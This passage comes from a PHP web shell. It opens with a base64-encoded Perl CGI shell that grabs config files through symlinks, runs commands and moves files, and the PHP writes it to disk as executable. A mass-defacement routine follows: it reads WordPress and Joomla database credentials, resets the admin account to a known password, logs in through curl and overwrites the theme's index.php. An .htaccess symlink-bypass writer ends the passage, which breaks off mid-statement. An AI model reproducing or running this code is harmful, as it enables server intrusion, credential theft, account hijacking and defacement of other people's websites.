odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.Unknown1337' target='_blank'>Klik Here</a>";
} 


 elseif($_GET['do'] == 'ngindexx') {
	{error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){$ar0=explode($marqueurDebutLien, $text);$ar1=explode($marqueurFinLien, $ar0[$i]);return trim($ar1[0]);}function randomt() {$chars = "abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);$i = 0;$pass = '';while ($i <= 7) {$num = rand() % 33;$tmp = substr($chars, $num, 1);$pass = $pass . $tmp;$i++;}return $pass;}function index_changer_wp($conf, $content) {$output = '';$dol = '$';$go = 0;$username = entre2v2($conf,"define('DB_USER', '","');");$password = entre2v2($conf,"define('DB_PASSWORD', '","');");$dbname = entre2v2($conf,"define('DB_NAME', '","');");$prefix = entre2v2($conf,$dol."table_prefix  = '","'");$host = entre2v2($conf,"define('DB_HOST', '","');");$link=mysql_connect($host,$username,$password);if($link) {mysql_select_db($dbname,$link) ;$dol = '$';$req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");} else {$output.= "[-] DB Error<br />";}if($req1) {$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = mysql_fetch_array($req);$site_url=$data["option_value"]; $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");$data = mysql_fetch_array($req);$template = $data["option_value"];$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");$data = mysql_fetch_array($req);$current_theme = $data["option_value"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/wp-login.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);$pos = strpos($buffer,"action=logout");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";$go = 1;}if($go) {$cond = 0;$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"/index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Updated Successfuly<br />";$hk = explode('public_html',$_file);$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));$cond = 1;}} else {$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template Updated Successfuly<br />";$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');$cond = 1;}} else {$output.= "[-] index.php can not load in Theme Editor<br />";}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.'COOKIE.txt');return array('cond'=>$cond, 'output'=>$output);}function index_changer_joomla($conf, $content, $domain) {$doler = '$';$username = entre2v2($conf, $doler."user = '", "';");$password = entre2v2($conf, $doler."password = '", "';");$dbname = entre2v2($conf, $doler."db = '", "';");$prefix = entre2v2($conf, $doler."dbprefix = '", "';");$host = entre2v2($conf, $doler."host = '","';");$co=randomt();$site_url = "http://".$domain."/administrator";$output = '';$cond = 0; $link=mysql_connect($host, $username, $password);if($link) {mysql_select_db($dbname,$link) ;$req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");$req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));} else {$output.= "[-] DB Error<br />";}if($req1){if ($req) {$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");$data = mysql_fetch_array($req);$template_name = $data["template"];$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");$data = mysql_fetch_array($req);$template_id = $data["extension_id"];$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$return = entre2v2($buffer ,'<input type="hidden" name="return" value="','"');$hidden = entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);if($return && $hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_REFERER, $url2);curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos){$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);if($hidden2) {$output.= "[+] index.php file found in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}} else {$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");$data = mysql_fetch_array($req);$template_name=$data["template"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);if($hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos) {$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);if($hidden2) {$output.= "[+] index.php file founded in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message fade">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.$co);return array('cond'=>$cond, 'output'=>$output); }function exec_mode_1($def_url) {@mkdir('sym',0777);$wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$fp = @fopen 